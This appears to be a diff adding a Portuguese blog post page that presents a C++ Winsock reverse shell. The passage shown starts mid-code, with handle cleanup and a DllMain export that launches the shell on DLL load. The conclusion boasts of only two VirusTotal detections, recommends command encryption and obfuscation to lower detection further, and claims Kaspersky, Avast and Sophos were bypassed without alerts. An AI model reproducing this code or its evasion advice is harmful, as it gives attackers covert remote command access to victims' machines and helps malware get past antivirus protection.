+    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);
+    <span class="hljs-built_in">CloseHandle</span>(hStdoutRead);
+    <span class="hljs-built_in">CloseHandle</span>(hStdinWrite);
+    <span class="hljs-built_in">closesocket</span>(sock);
+    <span class="hljs-built_in">WSACleanup</span>();
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WINDLL</span>
+__declspec(dllexport) <span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved)</span> </span>{
+    <span class="hljs-keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) {
+        <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)main, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+    }
+    <span class="hljs-keyword">return</span> TRUE;
+}
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
+</pre>
+            <br>
+            <h1 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Conclusão</h1>
+            <p>Concluímos a implementação de um <strong>Reverse Shell</strong> funcional utilizando <strong>C++</strong>
+              e a API <strong>Winsock</strong>. Este código, apesar de simples, demonstra os conceitos fundamentais de
+              redirecionamento de processos, manipulação de <strong>sockets</strong> e comunicação remota.</p>
+            <p>Ao longo deste post, exploramos como redirecionar a entrada e saída de um processo do
+              <strong>cmd.exe</strong>, além de como implementar a comunicação bidirecional entre o cliente e o servidor
+              por meio de <strong>sockets</strong>. Este é um exemplo claro de como os sistemas operacionais e redes
+              podem ser manipulados para criar soluções poderosas de controle remoto.
+            </p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Contra
+              VirusTotal</h2>
+            <p>Bom, contra o <strong>VirusTotal</strong> obtivemos um total de apenas <strong>2</strong> detecções, o
+              que é consideravelmente pouco, se quisermos, um resultado melhor, podemos combinar
+              <strong>criptografia</strong> de comando com chave aleatória e funções de <strong>ofuscação</strong> por
+              exemplo no <span style="color: #9E2525;">CreateProcess</span>.
+            </p>
+            <p><img src="https://i.imgur.com/owwftR6.png" alt="VirusTotal"
+                style="max-width: 100%; height: 480px; width: 720px; display: block; margin: 20px auto;"></p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Contra AV/EDR
+            </h2>
+            <p>Bom os <strong>antivírus</strong> que utilizei de teste foram ( <a href="https://www.kaspersky.com.br/"
+                href="https://www.kaspersky.com.br/" style="color: #9E2525;">kaspersky</a>, <a
+                href="https://www.avast.com/" href="https://www.avast.com/" style="color: #9E2525;">avast</a>, <a
+                href="https://www.sophos.com/pt-br/products/endpoint-antivirus/edr"
+                href="https://www.sophos.com/pt-br/products/endpoint-antivirus/edr" style="color: #9E2525;">sophos</a>
+              ), conseguimos contornar os três sem nenhum aviso.</p>
+            <br>
+            <div align="center">
+              <iframe width="980" height="615" src="https://www.youtube.com/embed/fxaZbGySYTk" frameborder="0"
+                allowfullscreen></iframe>
+            </div>
+            <br>
+            <p>Por fim, conseguimos ver que não é muito difícil contornar alguns antivírus utilizando um código simples
+              de <strong>reverse shell</strong>. Lembrando que o código tem muito a melhorar e que estamos apenas
+              levando em consideração um <strong>acesso inicial</strong>. Em um computador protegido, sem configurações
+              ou regras, as coisas são diferentes em ambientes realmente configurados e controlados.</p>
+            <p>Espero que tenham gostado deste post simples. Obrigado se chegou até aqui, e tchau tchau.</p>
+          </div>
+        </article>
+      </div>
+    </main>
+    <footer style="background-color: rgba(27, 27, 27, 0.7); text-align: center; padding: 5px 0;">
+      <h6 style="color: rgba(255, 255, 255, 0.4) !important;">Copyright © Vithor 2023/2024</h6>
+    </footer>
+    <script>
+      function isMobileDevice() {
+        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
+      }
+
+      if (isMobileDevice()) {
+        alert("Este site não é compatível com dispositivos móveis. Você será redirecionado para o Google.");
+        window.location.href = "https://www.google.com";
+      }
+    </script>
+  </body>
+
+</html>
